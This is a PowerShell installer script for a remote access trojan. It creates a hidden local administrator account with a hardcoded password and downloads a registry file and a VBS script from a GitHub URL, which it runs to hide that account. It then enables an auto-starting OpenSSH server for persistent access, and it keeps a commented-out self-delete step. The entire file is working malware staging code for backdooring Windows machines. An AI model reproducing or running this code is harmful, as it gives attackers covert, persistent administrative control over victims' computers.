#build resources for RAT
# Created by : Luke O'Sullivan

#Random string for directorys
function random_text{
    
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})

}
# create's local admin
function create_account {
    [CmdletBidning()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
        Write-Verbose "$uname local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$uname added to the local administrator group"

    }
    end {
    }
}
#create admin user
$uname = "rat"
$pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
create_account -uname $uname -pword $pword

#goto temp and make working directory
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location
mkdir $path
cd $path

# registry to hide local admin
$reg_file = random_text 
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/admin.reg -OutFile "$reg_file.reg"

#visual bacic script to registor the registory
$vbs_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"


#install the registry
./"$reg_file.reg"; "$vbs_file.vbs"

#cd $env:temp
#$directory_name = random_text
#mkdir $directory_name

## Variables
#$wd = random_text


#$path = "$env:temp/$wd"
#$initial_dir = Get-Location


#enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

# 



# self delete
#cd $initial_dir
#del Installer.ps1